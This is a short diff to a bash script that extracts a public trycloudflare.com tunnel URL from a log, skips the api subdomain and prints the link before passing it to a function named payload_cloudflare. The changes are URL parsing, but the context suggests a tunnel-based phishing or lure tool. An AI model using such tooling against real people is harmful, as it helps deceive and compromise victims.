@@ -53,10 +53,22 @@ command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not instal
 
 get_cloudflare_link() {
 local logfile="$1"
+local link=""
 if [[ ! -f "$logfile" ]]; then
 return 1
 fi
-grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' "$logfile" | head -n1
+# api.trycloudflare.com is the backend API — NOT the shareable public link
+link=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' "$logfile" | grep -viE 'https://api\.trycloudflare\.com' | head -n1)
+if [[ -n "$link" ]]; then
+printf "%s" "$link"
+return 0
+fi
+link=$(grep -oE '[a-zA-Z0-9-]+\.trycloudflare\.com' "$logfile" | grep -viE '^api\.trycloudflare\.com$' | head -n1)
+if [[ -n "$link" ]]; then
+printf "https://%s" "$link"
+return 0
+fi
+return 1
 }
 
 wait_for_cloudflare_link() {
@@ -582,6 +594,7 @@ restore_cloudflared_config
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
+printf "\e[1;77m    (Random *.trycloudflare.com URL — NOT api.trycloudflare.com)\e[0m\n"
 printf "\e[1;93m[\e[0m!\e[1;93m] Keep this terminal open — closing it stops the tunnel (Error 1033).\e[0m\n"
 fi
 payload_cloudflare "$link"
